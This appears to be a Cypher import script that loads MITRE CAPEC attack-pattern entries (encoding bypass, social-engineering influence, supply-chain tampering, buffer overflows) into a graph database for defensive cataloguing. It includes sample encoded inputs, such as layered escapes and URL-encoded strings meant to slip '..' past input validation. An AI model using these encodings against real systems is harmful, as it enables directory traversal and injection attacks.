CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '\\'</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Determine whether URL encoding is accepted by the application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine whether UTF-8 encoding is accepted by the application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Determine whether UTF-16 encoding is accepted by the application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Determine if any other encodings are accepted by the application/system.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">System provides error message similar to the one it provided when a positive indicator was received for the first step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Application/system accepts at least one high level character encoding where characters can be represented with multiple ASCII characters."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Application/system interprets each character separately."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Combine multiple encodings accepted by the application.", description: "<div level=\"0\">\n  <p class=\"text\">The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: \"\\\\\\.\". With two parsing layers, this may get converted to \"\\.\" after the first parsing layer, and then, to \".\" after the second. If the input validation layer is between the two parsing layers, then \"\\\\\\.\\\\\\.\" might pass a test for \"..\" but still get converted to \"..\" afterwards. This may enable directory traversal attacks.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Combine multiple encodings and observe the effects. For example, the attacker might encode \".\" as \"\\.\", and then, encode \"\\.\" as \"&#92;&#46;\", and then, encode that using URL encoding to \"%26%2392%3B%26%2346%3B\"</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Application/System interprets the multiple encodings properly.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker bypasses input validation layer(s) and passes data to application that it does not expect."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Leverage ability to bypass input validation", description: "<div level=\"0\">\n  <p class=\"text\">Attacker leverages his ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Gain access to sensitive files.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Perform command injection.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Perform SQL injection.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Perform XSS attacks.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Gaining unauthorized access to system functionality."});
MERGE (:Reference{id: "REF-2", local_id: "R.43.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.43.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 179});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 183});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 78});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 430, name: "Target Influence via Micro-Expressions", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 374});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 368, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.430.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 431, name: "Target Influence via Neuro-Linguistic Programming (NLP)", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 375});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 369, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.431.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 432, name: "Target Influence via Voice in NLP", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 376});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 370, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.432.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 433, name: "Target Influence via The Human Buffer Overflow", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 377});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 371, summary: "OrderedDict([('Text', 'An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on over-stimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message. The fundamental difference is that embedded messages have a complete semantic quality, rather than mere imagery, and the mind of the target tends to key off of particular dominant patterns. The remaining information, carefully structured, speaks directly to the subconscious with a subtle, indirect, command. The effect is to produce a pattern of thinking that the attacker has predetermined but is buried within the message and not overtly stated. Structuring a human \"buffer overflow\" requires precise attention to detail and the use of information in a manner that distracts the conscious mind from the message the subconscious is receiving.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.433.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 434, name: "Target Influence via Interview and Interrogation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 378});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 372, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.434.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 435, name: "Target Influence via Instant Rapport", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 379});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 373, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.435.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 438, name: "Modification During Manufacture", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 380});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:PreviousEntryName{id: 71, name: "Integrity Modification During Manufacture"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 374, summary: "OrderedDict([('Text', 'An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.438.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
MERGE (:Reference{id: "REF-33", local_id: "R.438.2", author: "Marcus Sachs", title: "Supply Chain Attacks: Can We Secure Information Technology Supply Chain in the Age of Globalization", publisher: "Verizon, Inc."});
MERGE (:Reference{id: "REF-34", local_id: "R.438.3", author: "Thea Reilkoff", title: "Hardware Trojans: A Novel Attack Meets a New Defense", publisher: "Yale School of Engineering and Applied Science", pubdate: "2010"});
MERGE (:Reference{id: "REF-32", local_id: "R.438.4", author: "['Marianne Swanson', 'Nadya Bartol', 'Rama Moorthy']", title: "Piloting Supply Chain Risk Management Practices for Federal Information Systems", section: "Section 1. Introduction", publisher: "National Institute of Standards and Technology", pubdate: "2010"});
CREATE (:AttackPattern{id: 439, name: "Manipulation During Distribution", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 381});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:PreviousEntryName{id: 72, name: "Integrity Modification During Distribution"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 375, summary: "OrderedDict([('Text', 'An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.439.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
MERGE (:Reference{local_id: "R.439.2", author: "SAFECode", title: "The Software Supply Chain Integrity Framework Defining Risks and Responsibilities for Securing Software in the Global Supply Chain", publisher: "Safecode.org", pubdate: "2009"});
MERGE (:Reference{id: "REF-32", local_id: "R.439.3", author: "['Marianne Swanson', 'Nadya Bartol', 'Rama Moorthy']", title: "Piloting Supply Chain Risk Management Practices for Federal Information Systems", section: "Section 1. Introduction", publisher: "National Institute of Standards and Technology", pubdate: "2010"});
CREATE (:AttackPattern{id: 44, name: "Overflow Binary Resource File", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 312, text: "<div level=\"0\">\n  <p class=\"text\">Target software processes binary resource files.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 313, text: "<div level=\"0\">\n  <p class=\"text\">Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.</p>\n</div>"});
CREATE (:Submission{id: 382});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 258});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 376, summary: "OrderedDict([('Text', 'An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the attacker access to the execution stack and execute arbitrary code in the target process. This attack pattern is a variant of standard buffer overflow attacks using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The attacker is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application, for the victim to download. The attacker then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.44.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 440, name: "Hardware Integrity Attack", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 383});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 259});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, Examples-Instances, References"});
CREATE (:PreviousEntryName{id: 73, name: "Integrity Modification During Deployed Use"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 377, summary: "OrderedDict([('Text', 'An attacker changes a technology, product, component, or sub-component during its deployed use at the victim location for the purpose of carrying out an attack.')])"});
CREATE (:AttackPattern{id: 441, name: "Malicious Logic Insertion", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 384});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 260});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 74, name: "Malicious Logic Inserted Into to Product"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 378, summary: "OrderedDict([('Text', 'An attacker installs or adds malicious logic into a seemingly benign component of the system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts.')])"});
CREATE (:AttackPattern{id: 442, name: "Malicious Logic Inserted Into To Product Software", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 385});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 261});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, Examples-Instances, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 75, name: "Malicious Logic Inserted Into Product Software"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 379, summary: "OrderedDict([('Text', 'An attacker inserts malicious logic into software, typically in the form of a traditional virus or trojan backdoor.')])"});
CREATE (:AttackPattern{id: 443, name: "Malicious Logic Inserted Into Product Software by Authorized Developer", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 386});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 262});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 380, summary: "OrderedDict([('Text', 'An attacker uses their privileged position within an authorized software development organization to inject malicious logic into a codebase or product. Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In other cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by adversaries.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.443.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 444, name: "Development Alteration", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 387});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 263});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 76, name: "Malicious Logic Insertion into Product Software via Externally Manipulated Component"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 381, summary: "OrderedDict([('Text', 'An attacker modifies a technology, product, or component during its development. The product is then delivered to the user where a negative impact is achieved.')])"});
CREATE (:AttackPattern{id: 445, name: "Malicious Logic Insertion into Product Software via Configuration Management Manipulation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 314, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 388});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 382, summary: "OrderedDict([('Text', \"An attacker exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an attacker can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an attacker can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server. Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an attacker who has compromised the server can alter the software baseline that clients must install, allowing the attacker to compromise a large number of satellite machines using the configuration management system. If an attacker can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place.\")])"});
MERGE (:Reference{id: "REF-31", local_id: "R.445.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 446, name: "Malicious Logic Insertion into Product Software via Inclusion of 3rd Party Component Dependency", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 389});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 383, summary: "OrderedDict([('Text', 'An attacker conducts supply chain attacks by the inclusion of insecure 3rd party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer. The result is a window of opportunity for exploiting the product or software until the insecure component is discovered. This supply chain threat can result in the installation of software that introduces widespread security vulnerabilities within an organization. One example could be the inclusion of an exploitable DLL (Dynamic Link Library) included within an antivirus technology. Because software often depends upon a large number of interdependent libraries and components to be present, security holes can be introduced merely by installing COTS software that comes pre-packaged with the components required for it to operate.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.446.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 447, name: "Design Alteration", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 390});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 264});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 77, name: "Malicious Logic Insertion into Product Software during Update"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 384, summary: "OrderedDict([('Text', 'An attacker modifies the design of a technology, product, or component. The product is then delivered to the user where a negative impact is achieved.')])"});
CREATE (:AttackPattern{id: 448, name: "Malware Infection into Product Software", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 315, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 391});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 385, summary: "OrderedDict([('Text', 'An attacker tampers with the code of a product and injects malicious logic into the device in order to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors becomes important vectors of attack.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.448.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 449, name: "DEPRECATED: Malware Propagation via USB Stick", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 392});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 265});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 266});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 78, name: "Malware Propagation via USB Stick"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 386, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-448 : Malware Infection into Product Software. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 45, name: "Buffer Overflow via Symbolic Links", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 316, text: "<div level=\"0\">\n  <p class=\"text\">The attacker can create symbolic link on the target host.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 317, text: "<div level=\"0\">\n  <p class=\"text\">The target host does not perform correct boundary checking while consuming data from a resources.</p>\n</div>"});
CREATE (:Submission{id: 393});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 387, summary: "OrderedDict([('Text', 'This type of attack leverages the use of symbolic links to cause buffer overflows. An attacker can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.')])"});
CREATE (:AttackPhase{id: 1, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker creates or modifies a symbolic link pointing to a resources (e.g., file, directory). The content of the symbolic link file includes out-of-bounds (e.g. excessive length) data.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The target host consumes the data pointed to by the symbolic link file. The target host may either intentionally expect to read a symbolic link or it may be fooled by the replacement of the original resource and read the attackers' symbolic link.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">While consuming the data, the target host does not check for buffer boundary which can lead to a buffer overflow. If the content of the data is controlled by the attacker, this is an avenue for remote code execution.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.45.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.45.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 450, name: "DEPRECATED: Malware Propagation via USB U3 Autorun", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 394});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 267});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 268});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 79, name: "Malware Propagation via USB U3 Autorun"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 388, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-448 : Malware Infection into Product Software. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 451, name: "DEPRECATED: Malware Propagation via Infected Peripheral Device", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 395});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 269});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 270});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 80, name: "Malware Propagation via Infected Peripheral Device"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 389, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-448 : Malware Infection into Product Software. Please refer to this other pattern going forward.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.451.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 452, name: "Malicious Logic Insertion into Product Hardware", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 396});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 390, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-31", local_id: "R.452.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 453, name: "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 397});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 271});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 272});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 81, name: "Malicious Logic Insertion via Counterfeit Hardware"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 391, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-452 : Malicious Logic Insertion into Product Hardware. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 454, name: "DEPRECATED: Modification of Existing Components with Counterfeit Hardware", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 398});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 273});
